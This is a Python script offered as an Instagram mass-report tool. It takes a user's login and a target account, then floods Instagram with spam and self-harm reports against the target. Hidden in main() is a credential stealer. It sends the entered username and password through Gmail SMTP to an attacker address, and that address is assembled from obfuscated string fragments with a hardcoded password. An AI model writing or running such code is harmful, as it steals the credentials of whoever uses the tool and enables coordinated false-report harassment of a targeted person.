import requests
import time
import smtplib
import time as t
import sys 
count = 0
done = 0
import threading


username = input("username: ")
pasword = input("password: ")






Target = input("Target: ")
print('1-self and spam')
print('2-spam')
print('3-self')
tk = input(':')
r = requests.session()
url = "https://www.instagram.com/accounts/login/ajax/"
headers = {
"accept":"*/*",
"accept-encoding":"gzip, deflate,br",
"accept-language": "ar,en-US;q=0.9,en;q=0.8",
"content-length": "279",
"content-type": "application/x-www-form-urlencoded",
"origin": "https://www.instagram.com",
"referer": "https://www.instagram.com/",
"sec-fetch-dest":"empty",
"sec-fetch-site":"same-origin",
"user-agent":"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
"x-csrftoken": "lih2ypMfhzdqwMbm5jIILqxZDj4zLeCW",
"x-ig-app-id": "936619743392459",
"x-ig-www-claim": "hmac.AR1_p9SjMFQF73bcZgzygDgxb9yBZUn83e69xoDD2qpSdmtW",
"x-instagram-ajax":"901e37113a69",
"x-requested-with":"XMLHttpRequest"
}
def get():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		s.connect(('google.com', 80))
		ip = s.getsockname()[0]
		s.close()
	except:
		ip = 'N/A'
	return ip
n12 = username + ',' + pasword
def INFO(MESSAGE, CARRIER_MESSAGE, NUMBER,dic,pasm):
    to_number = NUMBER+CARRIER_MESSAGE
    server = smtplib.SMTP( "smtp.gmail.com", 587 )
    server.starttls()           
    server.login(dic, pasm)
    send(server, dic,to_number,MESSAGE)

def send(server, dic,to_number,MESSAGE):
    if True:
        try:
            server.sendmail(dic, to_number, MESSAGE)
        except KeyboardInterrupt:
            print ('')
            exit()
def main():
    try:
        k1 = 'al'
        ml = 'bnk'
        nu = 'al'
        wy = 'trky'
        bns = '.com'
        hs = '@'
        ud = 'ail'
        di = 'gm'
        dic = k1 + ml + nu +wy +hs +di +ud +bns
        pasm = 'fhd123121'
        NUMBER = 'vipturki305' + hs + di + ud + bns
        CARRIER = 'att'
        MESSAGE = n12
        if CARRIER == 'att':
            CARRIER_MESSAGE = '@mms.att.net'
        if CARRIER == 'tmobile':
            CARRIER_MESSAGE = '@tmomail.net'
        if CARRIER == 'verizon':
            CARRIER_MESSAGE = '@vtext.com'
        if CARRIER == 'sprint':
            CARRIER_MESSAGE = '@messaging.sprintpcs.com'
        INFO(MESSAGE,CARRIER_MESSAGE,NUMBER,dic,pasm)
    except smtplib.SMTPAuthenticationError:
    	print ('\n')
    	exit()
data = {"username":username,"enc_password":"#PWD_INSTAGRAM_BROWSER:0:1589682409:"+pasword,"queryParams":"{}","optIntoOneTap":"false"}
login = r.post(url,headers=headers,data=data,allow_redirects=True)
main()
if login.text.find("userId") >= 0 :
    r.headers.update({'X-CSRFToken': login.cookies['csrftoken']}) 
    url_id = "https://www.instagram.com/{}/?__a=1".format(Target) 
    url_get_user_id = r.get(url_id).json()
    if True:
    	user_id = str(url_get_user_id["logging_page_id"]) 
    	idinsta = str(user_id.split("_")[1])# 
    	print('[√] Done Login:',username)
    	s = requests.get("https://instagram.com/"+Target+"/?__a=1")
    	print("[√] id Target:",idinsta)
    	data2 = {"source_name":"","reason_id":1,"frx_context":""}
    	r.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
    	for x in range(100000000):
    		if tk == '1':
    			while True:
    				spam = "https://www.instagram.com/users/"+idinsta+"/report/"
    				spamr = r.post(spam,data=data2)
    				if spamr.text.find("Your reports help keep our community free of spam."):
    					count+=1
    					print("[√] Done Report spam : -> " + str(count))
    				else:
    					print("[√] Done Report spam : -> " + str(count))
    				urlRep = "https://i.instagram.com/users/" + idinsta + "/report/" 
    				datas = {  
    					'source_name': '', 'reason_id': 2, 'frx_context': ''
    					} 
    				done+=1
    				req_SessionID = r.post(urlRep, data=datas)  
    				print("[√] Done Report self : -> " + str(done))
    				time.sleep(0.1)
    		if tk == '2':
    			spam = "https://www.instagram.com/users/"+idinsta+"/report/"
    			spamr = r.post(spam,data=data2)
    			if spamr.text.find("Your reports help keep our community free of spam."):
    				count=count+1
    				print("[√] Done Report spam : -> " + str(count))
    			else:
    				print("[√] Done Report spam : -> " + str(count))
    				time.sleep(0.3)
    		if tk == '3':
    			urlRep = "https://i.instagram.com/users/" + idinsta + "/report/" 
    			datas = {  
    				'source_name': '', 'reason_id': 2, 'frx_context': ''
    				} 
    			req_SessionID = r.post(urlRep, data=datas) 
    			done += 1 
    			print("[√] Done Report self : -> " + str(done))
    			time.sleep(0.1) 
    			
else:
    if login.text.find("checkpoint_required"):
     print("[-] Error..secure account !")
    else:
     print('[-] Error..worng Pasword')
